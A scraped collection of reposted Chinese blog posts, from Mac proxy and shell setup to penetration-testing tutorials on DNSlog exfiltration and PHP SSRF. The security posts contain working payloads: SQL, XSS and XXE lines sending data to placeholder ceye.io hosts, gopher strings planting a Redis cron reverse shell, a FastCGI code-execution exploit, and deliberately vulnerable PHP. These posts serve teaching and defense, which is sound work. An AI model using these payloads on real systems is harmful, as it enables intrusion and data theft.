​ 2.在文件结尾增加以下配置 123# proxyalias proxy='export all_proxy=socks5://127.0.0.1:1087'alias unproxy='unset all_proxy' 或者 123#ssralias ssr=&quot;export http_proxy=http://127.0.0.1:1087&quot;alias unssr=&quot;unset http_proxy&quot; ​ 3.使配置生效 1source ~/.zshrc 2、配置验证 查看现有IP curl ip.cn 12#返回结果示例当前 IP：103.193.xx.xx 来自：香港 或者 curl cip.cc 开启代理 proxy 或 ssr 关闭代理 unproxy 或 unssr 常见问题 问题：command not found: proxy 说明你未使用source命令使配置生效 问题：curl: (7) Failed to connect to 127.0.0.1 port 1080: Connection refused 请检查协议类型 socks、http是否配置有误，并检查端口是否配置有误 问题：curl: (52) Empty reply from server 请检查你的代理服务器是否正常 问题：执行proxy命令后，curl请求超时 请检查协议类型 socks、http是否配置有误，以及检查你的代理服务器是否正常 提醒：每个新开窗口都需要单独执行命令才可以正常使用 三、Git配置代理通过设置git代理 12git config –global http.proxy 'http://127.0.0.1:1087'go get golang.org/xxx 四、go配置代理若使用goagent代理，请使用设置git代理的方式，且额外执行以下脚本再go get： 若使用goagent代理，请使用设置git代理的方式，且额外执行以下脚本再go get： 1git config --global http.sslCAinfo 'pathto/XX-Net-3.6.15/data/gae_proxy/CA.crt'","link":"/2019/10/27/mac/MAC%E7%BB%88%E7%AB%AF%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"},{"title":"Mac OS X 配置环境变量","text":"Mac端环境变量配置Mac使用bash做为默认的shell MAC OS X环境配置的加载顺序 12345678910# 系统级别/etc/profile/etc/paths # 用户级别~/.bash_profile ~/.bash_login ~/.profile ~/.bashrc 前两个是系统级别的环境变量，针对所有用户，后面四个带有~/用户级别的环境变量。 前两个环境配置在系统启动时候就会加载，是全局配置 ~/.bash_profile，~/.bash_login，~/.profile依次加载，如果~/.bash_profile不存在，依次加载后面几个文件；如果~/.bash_profile文件存在，后面几个文件不会加载 ~/.bashrc 是bash shell打开时候加载 全局环境变量设置修改全局环境变量时候参考系统默认的环境变量配置格式。 修改全局环境变量需要root权限。 /etc/paths 全局建议修改这个文件 /etc/profile 不建议修改这个文件，全局共有配置，用户登录时候都会加载该文件 /etc/bashrc 一般在这个文件中添加系统级别的环境变量，全局共有配置，bash shell执行时候都会加载 用户级别环境变量设置在~/.bash_profile中配置环境。 1234567891011121314151617181920212223242526272829303132333435363738# 使用冒号隔开export PATH=$PATH:&lt;PATH 1&gt;:&lt;PATH 2&gt;:&lt;PATH 3&gt;:------:&lt;PATH N&gt;# 或者 export PATH=${PATH}:&lt;PATH 1&gt;export PATH=${PATH}:&lt;PATH 2&gt;# 第一种将路径合并在一起，不方便删除，建议使用第二种，换行挨个设置# javaexport JAVA_HOME = /home/myuser/jdk1.7.0_03export PATH = $JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar# hadoopexport HADOOP_HOME=/Users/YourUserName/Documents/Dev/hadoop-2.7.3export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin# spunkexport SPLUNK_HOME=/Applications/Splunkexport PATH=$PATH:$SPLUNK_HOME/bin# Setting PATH for Python 3.5# The original version is saved in .bash_profile.pysavePATH=&quot;/Library/Frameworks/Python.framework/Versions/3.5/bin:${PATH}&quot;export PATHexport CLASSPATH=${CLASSPATH}:/Users/YourUserName/Documents/Lib/hadoop_cli# antexport ANT_HOME=/Users/YourUserName/Documents/Dev/apache-ant-1.9.7export PATH=$PATH:${ANT_HOME}/bin# JBOSSexport JBOSS_HOME=/Users/YourUserName/Documents/Dev/wildfly-10.1.0.Finalexport PATH=$PATH:$JBOSS_HOME/bin# M2_HOMEexport M2_HOME=/Users/YourUserName/Documents/Dev/apache-maven-3.3.9export PATH=$PATH:$M2_HOME/bin 重新载入配置文件在环境配置完毕后，一般是重新电脑才会生效，如果想要立即生效，执行以下指令 1234source &lt;相应文件配置文件&gt;#示例source .bash_profile","link":"/2019/11/15/mac/Mac-OS-X-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"title":"MacOS使用proxychains-ng","text":"源码安装Proxychains-ng 12345&quot;&quot;&quot;不推荐：brew install proxychains-ng # 超慢&quot;&quot;&quot;$ git clone https://github.com/rofl0r/proxychains-ng 编译安装 12345$ cd proxychains-ng$ ./configure --prefix=/usr --sysconfdir=/etc$ make$ make install$ sudo make install-config # 安装proxychains.conf配置文件 注：mac上 make install 会报错 因为： Mac下用Homebrew安装的默认为/usr/local/etc/proxychains.conf 解决方法： 12345678cd configure vi config.mak将：bindir = /usr/binlibdir = /usr/lib修改为：bindir=/usr/local/binlibdir=/usr/local/lib MAC下安装关闭 SIP macOS 10.11 后下由于开启了 SIP（System Integrity Protection） 会导致命令行下 proxychains-ng 代理的模式失效，如果使用 proxychains-ng 这种简单的方法，就需要先关闭 SIP。 具体的关闭方法如下（我使用了部分关闭SIP，可work）： 部分关闭 SIP 重启Mac，按住Option键进入启动盘选择模式，再按⌘ + R进入Recovery模式。 实用工具（Utilities）-&gt; 终端（Terminal）。 输入命令*csrutil enable --without debug*运行。 重启进入系统后，终端里输入 csrutil status，结果中如果有 Debugging Restrictions: disabled 则说明关闭成功。 完全关闭 SIP 重启Mac，按住Option键进入启动盘选择模式，再按⌘ + R进入Recovery模式。 实用工具（Utilities）-&gt; 终端（Terminal）。 输入命令*csrutil disable*运行。 重启进入系统后，终端里输入 csrutil status，结果中如果有 System Integrity Protection status:disabled. 则说明关闭成功。 配置proxychains-ng12cd /usr/local/etcvi proxychains.conf 将以下一项的注释取消： 1quiet_mode # 49行 在[ProxyList]下添加socks5代理 （115行） 12345678910# 代理端口一定要和shadowsocks中的保持一致# 如果有不明白的可以查看93～110[ProxyList]socks5 127.0.0.1 1080# http 127.0.0.1 1235 (me)# add proxy here ...# meanwile# defaults set to &quot;tor&quot;# socks4 127.0.0.1 9050 注：默认的socks4 127.0.0.1 9095是tor代理，而socks5 127.0.0.1 1080是shadowsocks的代理。 Proxychains-ng使用proxychains-ng 语法1proxychains4 操作 参数 Proxychains-ng 测试12345678910$ proxychains4 curl cip.cc [proxychains] config file found: /usr/local/etc/proxychains.conf[proxychains] preloading /usr/local/lib/libproxychains4.dylibIP : 210.140.221.90地址 : 日本 福岛县 白河市运营商 : idcf.jp数据二 : 日本 | IDC Frontier东日本软银(SoftBank)数据中心数据三 : 日本 Prochains-ng 优化每次都要输入proxychains4, 太长，取个别名 打开.zshrc、.bashrc 1vi ~/.zshrc 加入此行 1alias pc='proxychains4' # 注 &quot;=&quot;不要有空格 测试： 1pc curl cip.ccpc brew update 错误参考链接： https://github.com/rofl0r/proxychains-ng/issues/139 https://github.com/haad/proxychains/issues/71 https://github.com/rofl0r/proxychains-ng/issues/78 https://unix.stackexchange.com/questions/244272/proxy-timeout-error https://github.com/mrdulin/blog/issues/18 https://wwyqianqian.github.io/2017/08/21/proxychains-privoxy/ 转载自https://medium.com/@xiaoqinglin2018/mac-osx-%E4%BD%BF%E7%94%A8proxychains-ng-91ba61472fdf","link":"/2019/11/01/mac/MacOS%E4%BD%BF%E7%94%A8proxychains-ng/"},{"title":"CentOS搭建msf框架","text":"centos7安装Metasploit框架 Metasploit应该不用多说了吧？Kali自带、Win和Mac都提供了现成的安装包，不过我莫名的对apt系不感冒，这里记录一下在centos7上安装metasploit框架的步骤，理论上yum系的都应该通用。首先执行 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall 如果网速太慢 ，可以在本地执行，然后通过scp命令上传到服务器。 scp /path/filename username@servername:/path 然后执行 123chmod 755 msfinstall./msfinstall 然后安装postgresql： 12yum install postgresqlyum install postgresql-server","link":"/2019/11/07/web%E6%B8%97%E9%80%8F/CentOS%E6%90%AD%E5%BB%BAmsf%E6%A1%86%E6%9E%B6/"},{"title":"brew和brew cask区别","text":"brew主要用来下载一些不带界面的命令行下的工具和第三方库来进行二次开发brew cask主要用来下载一些带界面的应用软件，下载好后会自动安装，并能在mac中直接运行使用 举个例子，brew install curl可以安装curl第三方库，这样你在开发时就可以使用它的库来进行开发brew cask install chrome可以安装谷歌浏览器应用程序，可直接运行 brew偏管理第三方库和命令行工具方面的东东brew cask可以看作是苹果官方app store的补充，是一个众多贡献者们维护的非苹果官方软件商店，你也可以在这里下mac软件用 brew是从下载源码解压然后./configure &amp;&amp; make install，同时会包含相关依存库。并自动配置好各种环境变量，而且易于卸载。这个对程序员来说简直是福音，简单的指令，就能快速安装和升级本地的各种开发环境。 而brew cask是已经编译好了的应用包(.dmg/.pkg) ，仅仅是下载解压，放在统一的目录中(/opt/homebrew-cask/Caskroom)，省掉了自己去下载、解压、拖拽(安装)等蛋疼步骤，同样，卸载相当容易与干净。这个对一般用户来说会比较方便，包含很多在AppStore里没有的常用软件。","link":"/2019/10/27/mac/brew%E5%92%8Cbrew-cask%E5%8C%BA%E5%88%AB/"},{"title":"DNSlog注入","text":"之前一直有看到过DNSlog这个字眼，但一直没有好好去了解一下，最近又接触到了刚好来深入学习下 0x01 什么是DNSlog我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名A.com，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名www.baidu.com等的访问信息，类似日志文件。那怎么利用DNSlog进行注入呢？得深入了解一下DNSlog 0x02 DNSlog回显原理前面说DNSlog就是日志，那怎么用DNSlog进行注入并回显信息呢。我们得再了解一个多级域名的概念。域名分级与域名解析过程(DNS)因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。如：tieba.baidu.com它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不分区大小写。再来看一个图通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。看个直观一点的例子来理解：ping命令的时候会用到DNS解析所以我就用ping命令做个实验。可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将longkey.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog，看到这里应该有点感觉了。原理上只要能进行DNS请求的函数都可能存在DNSlog注入。 通常用在哪些地方 1.SQL注入中的盲注在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显2.无回显的命令执行我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功3.无回显的SSRF推荐平台:http://www.dnslog.cnhttp://admin.dnslog.linkhttp://ceye.io这里用http://ceye.io来做演示这是一个免费的记录dnslog的平台，我们注册后到控制面板会给你一个三级域名：xxx.ceye.io,当我们把注入信息放到四级域名那里，后台的日志会记录下来，还是之前那个例子，我把它放到四级域名的位置。然后查看DNSlog可以看到%USERNAME%的值被记录到DNSlog上了 ****0x03 DNSlog利用姿势**3\\|1\\SQL注入利用load_file函数图解就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——UNC路径 UNC路径 UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。\\abc.xxx\\test这也就解释了为什么CONCAT()函数拼接了4个\\了，双斜杠表示网络资源路径多加两个\\就是转义了反斜杠。通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。1、当secure_file_priv为空，就可以读取磁盘的目录。2、当secure_file_priv为G:\\，就可以读取G盘的文件。3、当secure_file_priv为null，load_file就不能加载文件。通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。直接在mysql命令行执行： 1select load_file('\\\\\\\\requests.xxxx.ceye.io\\\\aa'); 查看DNSlog这是最基本的用法，来看看利用盲注来回显。 1payload：' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\abc'))),1,0)--+ 利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog可以看到数据库名已经被获取 3\\|2**XSS**XSS 盲打在安全测试的时候是比较常用的 1payload: &quot;&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;&quot; 当然也可以打cookie，不过目前实现的条件极为苛刻，就不多说了。 3\\|3**SSRF**根据上面两个例子，熟悉 SSRF 的肯定也是知道怎么玩了 1payload: &quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\\\aa&quot;&gt; ...&quot; 3\\|4**XXE**当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样 1234&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://XXXX.ceye.io/%file;'&gt;&quot;&gt;%all; 在我们的ceye平台就可以接收到这个读取的服务器文件了。当安全维护人员对服务器做了安全防护，使XXE不可以解析外部实体，但是这种任然是从前台直接传递的时候，依旧是存在SSRF漏洞。所以对XXE的安全防护是必须严格化的。 3\\|5**命令执行**以前在命令执行无法回显的时候可能会借用类似 python -m SimpleHTTPServer 这样的环境，采用回连的检测机制来实时监控访问日志。Liunx 系统环境下一般是使用 curl 命令或者 wget 命令，而 windows 系统环境就没有这么方便的命令去直接访问一个链接，常用的是 ftp命令和 PowerShell 中的文件下载来访问日志服务器。现在，有了一个比较通用的做法同时兼顾 Liunx 和 windows 平台，那就是 ping 命令，当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。就像我之前第一个例子，用windows的系统变量 1payload: &quot; ping %PATH%.pxxx.ceye.io ...&quot; 最后，在回显数据时，域名能够接受的字符是有条件限制的，某些不适合作为域名的特殊字符可能会被屏蔽掉，针对这种情况我们也可以base64编码后再进行请求。 转载自：https://www.cnblogs.com/Xy--1/p/12896599.html","link":"/2020/08/04/web%E6%B8%97%E9%80%8F/DNSlog%E6%B3%A8%E5%85%A5/"},{"title":"SSRF IN PHP","text":"1. 漏洞简介 SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 2. 漏洞利用自从煤老板的paper放出来过后，SSRF逐渐被大家利用和重视起来。 2.1 本地利用拿PHP常出现问题的cURL举例。 可以看到cURL支持大量的协议，例如file, dict, gopher, http 1234➜ curl -Vcurl 7.43.0 (x86_64-apple-darwin15.0) libcurl/7.43.0 SecureTransport zlib/1.2.5Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftpFeatures: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz UnixSockets 本地利用姿势： 123456789# 利用file协议查看文件curl -v 'file:///etc/passwd'# 利用dict探测端口curl -v 'dict://127.0.0.1:22'curl -v 'dict://127.0.0.1:6379/info'# 利用gopher协议反弹shellcurl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a' 2.2 远程利用漏洞代码ssrf.php（未做任何SSRF防御） 12345678910function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}$url = $_GET['url'];curl($url); 远程利用方式： 12345678# 利用file协议任意文件读取curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'# 利用dict协议查看端口curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'# 利用gopher协议反弹shellcurl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a' 漏洞代码ssrf2.php 限制协议为HTTP、HTTPS 设置跳转重定向为True（默认不跳转） 123456789101112131415&lt;?phpfunction curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True); // 限制为HTTPS、HTTP协议 curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}$url = $_GET['url'];curl($url);?&gt; 此时，再使用dict协议已经不成功。 1http://sec.com:8082/sec/ssrf2.php?url=dict://127.0.0.1:6379/info 3. 如何转换成gopher协议刚一开始看到这个协议，不知道如何转换。希望写点经验给大家，有不对的地方，还望指出。 3.1 redis反弹shell先写一个redis反弹shell的bash脚本如下：我不喜欢用flushall，太不友好。 12345echo -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 该代码很简单，在redis的第0个数据库中添加key为1，value为\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n\\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。 执行脚本命令： 1bash shell.sh 127.0.0.1 6379 想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。转发命令如下： 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 意思是将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。 执行脚本 1bash shell.sh 127.0.0.1 4444 捕获到数据如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&gt; 2017/10/11 01:24:52.432446 length=85 from=0 to=84*3\\r$3\\rset\\r$1\\r1\\r$58\\r*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\r&lt; 2017/10/11 01:24:52.432685 length=5 from=0 to=4+OK\\r&gt; 2017/10/11 01:24:52.435153 length=57 from=0 to=56*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$16\\r/var/spool/cron/\\r&lt; 2017/10/11 01:24:52.435332 length=5 from=0 to=4+OK\\r&gt; 2017/10/11 01:24:52.437594 length=52 from=0 to=51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2017/10/11 01:24:52.437760 length=5 from=0 to=4+OK\\r&gt; 2017/10/11 01:24:52.439943 length=14 from=0 to=13*1\\r$4\\rsave\\r&lt; 2017/10/11 01:24:52.443318 length=5 from=0 to=4+OK\\r&gt; 2017/10/11 01:24:52.446034 length=14 from=0 to=13*1\\r$4\\rquit\\r&lt; 2017/10/11 01:24:52.446148 length=5 from=0 to=4+OK\\r 转换规则如下： 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a 空白行替换为%0a 写了个脚本进行转换：tran2gopher.py 12345678910111213141516171819202122232425262728python tran2gopher.py socat.log#coding: utf-8#author: JoyChouimport sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] == r'\\r': # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\\r', '%0d%0a') # 去掉最后的换行符 line = line.replace('\\n', '') exp = exp + line # 判断是否是空行，空行替换为%0a elif line == '\\x0a': exp = exp + '%0a' else: line = line.replace('\\n', '') exp = exp + lineprint exp 结果为： 1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度为58个字节，上面的EXP即是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a，3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。 本地cURL测试是否成功写入： 1curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a' 返回5个OK 12345+OK+OK+OK+OK+OK 证明应该没有问题。那再检测以下Redis写入的字段和crontab的内容。 检测Redis数据库的字段为&quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n\\n&quot; 检测crontab的内容也没有问题 3.2 攻击FastCGI3.2.1 利用条件 libcurl版本&gt;=7.45.0 PHP-FPM监听端口 PHP-FPM版本 &gt;= 5.3.3 知道服务器上任意一个php文件的绝对路径 由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断。 https://curl.haxx.se/changes.html#7_45_0 Fixed in 7.45.0 - October 7 2015 gopher: don’t send NUL byte 3.2.2 转换为Gopher的EXP监听一个端口的流量 nc -lvv 2333 &gt; 1.txt，执行EXP，流量打到2333端口 1python fpm.py -c &quot;&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;&quot; -p 2333 127.0.0.1 /usr/local/nginx/html/p.php urlencode 1234f = open('1.txt')ff = f.read()from urllib import quoteprint quote(ff) 得到gopher的EXP 1%01%01%16%21%00%08%00%00%00%01%00%00%00%00%00%00%01%04%16%21%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/nginx/html/p.php%0B%1BSCRIPT_NAME/usr/local/nginx/html/p.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/nginx/html/p.php%01%04%16%21%00%00%00%00%01%05%16%21%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%16%21%00%00%00%00 执行EXP 1curl 'gopher://127.0.0.1:9000/_%01%01%16%21%00%08%00%00%00%01%00%00%00%00%00%00%01%04%16%21%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/nginx/html/p.php%0B%1BSCRIPT_NAME/usr/local/nginx/html/p.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/nginx/html/p.php%01%04%16%21%00%00%00%00%01%05%16%21%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%16%21%00%00%00%00' 4. 漏洞代码curl造成的SSRF 12345678910function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}$url = $_GET['url'];curl($url); file_get_contents造成的SSRF 12$url = $_GET['url'];;echo file_get_contents($url); fsockopen造成的SSRF 1234567891011121314151617181920212223function GetFile($host,$port,$link) { $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) { echo &quot;$errstr (error number $errno) \\n&quot;; } else { $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=''; while (!feof($fp)) { $contents.= fgets($fp, 1024); } fclose($fp); return $contents; } } 5. 漏洞修复 限制协议为HTTP、HTTPS 禁止30x跳转 设置URL白名单或者限制内网IP 6. Reference SSRF to GETSHELL [利用 gopher 协议拓展攻击面](https://ricterz.me/posts/利用 gopher 协议拓展攻击面) WAVR SSRF 转载自：https://joychou.org/web/phpssrf.html#comments","link":"/2020/09/09/web%E6%B8%97%E9%80%8F/SSRF-IN-PHP/"},{"title":"SSRF到GETSHELL","text":"SSRF到GET SHELL（附修复方案）背景 SSRF一般用来探测内网服务，但由于应用层使用的Request服务（curl/filegetcontents）一般不只是支持HTTP/HTTPS，导致可以深层次利用。 检测方式 PHP和Java的检测方式类似，找到Request的时候URL的入参是否可以外部控制来判断是否存在SSRF。（已加入Cobra扫描规则） PHP1234567891011121314151617181920212223242526272829303132/** * file_get_contents SSRF Example * * @author Feei &lt;wufeifei@wufeifei.com&gt; * @link http://wufeifei.com/ssrf */# 任意文件读取$url = 'file:///etc/passwd';echo file_get_contents($url);# 操作Redis$url = 'dict://127.0.0.1:6379/info';echo file_get_contents($url);/** * CURL SSRF Example * * @author Feei &lt;wufeifei@wufeifei.com&gt; * @link http://wufeifei.com/ssrf */function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}# 任意文件读取$url = 'file:///etc/passwd';curl($url);# 操作Redis$url = 'dict://127.0.0.1:6379/info';curl($url); Java利用方式拿常用的Curl举例，Curl默认支持的协议非常多。 1234$ curl -Vcurl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8 Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets dict （操作Redis） file （任意文件读取） ftp、ftps （FTP爆破） tftp（UDP协议扩展） gopher （操作Redis、Memcached） imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） rtsp smb/smbs （连接SMB） telnet - 连接SSH/Telnet http、https - 